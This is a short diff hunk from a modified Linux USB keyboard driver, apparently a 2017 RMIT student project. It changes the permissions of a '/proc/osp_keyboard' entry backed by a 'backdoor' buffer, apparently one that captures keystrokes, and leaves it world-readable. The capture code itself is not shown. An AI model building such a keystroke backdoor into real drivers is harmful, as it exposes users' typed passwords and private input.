@@ -419,7 +419,7 @@ static int osp_backdoor_init()
 	printk(KERN_ALERT "usbkbd: Modified by Ming Hu s3554025 @ RMIT University, 2017; forked from Linux kernel v4.13.");
 	printk(KERN_INFO "usbkbd: Length of maxium backdoor size: %d", osp_backdoor_buffer_maxsize);
 
-	osp_proc_entry = proc_create("osp_keyboard", 0644, NULL, &osp_proc_fops);
+	osp_proc_entry = proc_create("osp_keyboard", 0444, NULL, &osp_proc_fops);
 	osp_backdoor_buffer = vmalloc(osp_backdoor_buffer_maxsize);
 	osp_backdoor_buffer_length = 0;
 
